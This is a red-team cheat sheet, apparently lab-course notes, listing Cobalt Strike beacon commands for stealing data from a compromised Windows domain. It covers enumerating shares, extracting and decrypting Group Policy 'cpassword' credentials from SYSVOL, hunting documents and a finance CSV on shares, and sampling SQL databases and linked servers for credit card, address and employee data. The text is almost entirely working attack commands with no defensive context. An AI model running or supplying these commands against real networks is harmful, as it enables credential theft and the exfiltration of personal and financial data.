# Data Exfiltration

# Enumerate Share

    beacon> powerpick Invoke-ShareFinder
    beacon> powerpick Invoke-FileFinder
    beacon> powerpick Get-FileNetServer
    beacon> shell findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
    beacon> Get-DecryptedCpassword

# Find accessible share having juicy information

    beacon> powerpick Find-DomainShare -CheckShareAccess
    beacon> powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
    beacon> powerpick gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5

# Search for senstive data in directly accessible DB by keywords

    beacon> powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize

# Search for senstive data in DB links

    beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

    beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"

    beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"
